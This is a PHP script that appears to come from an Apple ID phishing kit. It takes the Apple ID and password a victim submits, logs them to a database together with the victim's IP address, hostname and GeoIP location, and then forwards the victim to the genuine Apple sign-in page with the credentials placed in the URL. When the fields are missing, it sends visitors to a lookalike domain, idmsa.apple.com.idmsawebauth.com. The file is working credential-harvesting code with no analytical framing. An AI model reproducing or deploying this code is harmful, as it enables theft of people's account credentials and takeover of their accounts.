<?php


if(($_REQUEST['appleId'])&&($_REQUEST['accountPassword'])&&($_REQUEST['appIdKey']))
	{
	
$ip = getenv("REMOTE_ADDR");                                                                          
$hostname = gethostbyaddr($ip);

// include the php script
include("../lib/geoip.inc");
include("../classes/apple.php");
include("../classes/get_db.php");
// open the geoip database
$gi = geoip_open("../lib/GeoIP.dat",GEOIP_STANDARD);
// to get country code
$country_code = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
// to get country name
$country_name = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);
$addr_ip=$ip.'-'.$hostname;
$time=date("Y-m-d h:i");

$bdd=getconnexion();
$g=new apple($bdd);
					$g->set_mail($_REQUEST['appleId']);
					$g->set_pass($_REQUEST['accountPassword']);
					$g->set_time($time);
					$g->set_addr_ip($addr_ip);
					$g->insert_account();





 print("<script type=\"text/javascript\">setTimeout('location=(\"https://idmsa.apple.com//IDMSWebAuth/authenticate?appIdKey=45571f444c4f547116bfd052461b0b3ab1bc2b445a72138157ea8c5c82fed623&appleId=".$_REQUEST['appleId']."&accountPassword=".$_REQUEST['accountPassword']."\")' ,0);</script>");

 
 





}
else
{
print("<script type=\"text/javascript\">setTimeout('location=(\"http://idmsa.apple.com.idmsawebauth.com\")' ,0);</script>");
}
?>



